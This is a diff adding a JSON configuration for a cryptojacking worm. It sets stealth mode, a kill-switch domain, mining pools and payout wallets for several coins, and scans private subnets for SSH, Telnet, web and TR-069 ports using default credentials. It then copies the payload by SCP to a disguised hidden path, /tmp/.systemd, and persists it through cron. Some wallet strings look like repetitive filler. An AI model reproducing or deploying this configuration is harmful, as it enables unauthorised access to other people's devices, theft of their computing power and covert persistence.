@@ -1,0 +1,73 @@
+{
+  "mining_configuration": {
+    "version": "1.2.0",
+    "update_interval_hours": 6,
+    "stealth_mode": true,
+    "max_cpu_usage": 75,
+    "idle_mining": false,
+    "kill_switch_domain": "check-update.example.com"
+  },
+  "mining_pools": [
+    {
+      "pool_id": "POOL-ETH-01",
+      "url": "stratum+tcp://us1.ethermine.org:4444",
+      "protocol": "stratum",
+      "backup_url": "stratum+tcp://us2.ethermine.org:4444",
+      "username": "0x742d35Cc6634C0532925a3b844Bc9e90F4bA3eF6",
+      "password": "x",
+      "priority": 1
+    },
+    {
+      "pool_id": "POOL-XMR-01",
+      "url": "stratum+tcp://pool.supportxmr.com:3333",
+      "protocol": "stratum",
+      "backup_url": "stratum+tcp://pool.supportxmr.com:5555",
+      "username": "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD",
+      "password": "worker-01",
+      "priority": 2
+    },
+    {
+      "pool_id": "POOL-RVN-01",
+      "url": "stratum+tcp://stratum.ravenminer.com:3838",
+      "protocol": "stratum",
+      "backup_url": "stratum+tcp://stratum.ravenminer.com:4848",
+      "username": "RFtTb3qQrKZ7qk7qk7qk7qk7qk7qk7qk7qk",
+      "password": "x",
+      "priority": 3
+    }
+  ],
+  "wallet_addresses": {
+    "ethereum": "0x742d35Cc6634C0532925a3b844Bc9e90F4bA3eF6",
+    "monero": "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD",
+    "ravencoin": "RFtTb3qQrKZ7qk7qk7qk7qk7qk7qk7qk7qk",
+    "bitcoin": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
+    "litecoin": "Lc6YHp7v7r7q7q7q7q7q7q7q7q7q7q7q7q7q"
+  },
+  "mining_parameters": {
+    "algorithm": "ethash",
+    "intensity": 15,
+    "threads": 2,
+    "worksize": 8,
+    "gpu_allowed": false,
+    "cpu_affinity": "0,1",
+    "auto_update": true,
+    "max_temp_shutdown": 85
+  },
+  "network_scan": {
+    "target_subnets": ["192.168.1.0/24", "10.0.0.0/24", "172.16.0.0/24"],
+    "scan_ports": [22, 23, 80, 443, 8080, 7547],
+    "common_credentials": [
+      {"username": "admin", "password": "admin"},
+      {"username": "root", "password": "123456"},
+      {"username": "user", "password": "user"},
+      {"username": "support", "password": "support"}
+    ],
+    "scan_interval_minutes": 120
+  },
+  "payload_deployment": {
+    "method": "ssh_scp",
+    "target_path": "/tmp/.systemd",
+    "persistence_method": "cron",
+    "cleanup_old_versions": true
+  }
+}
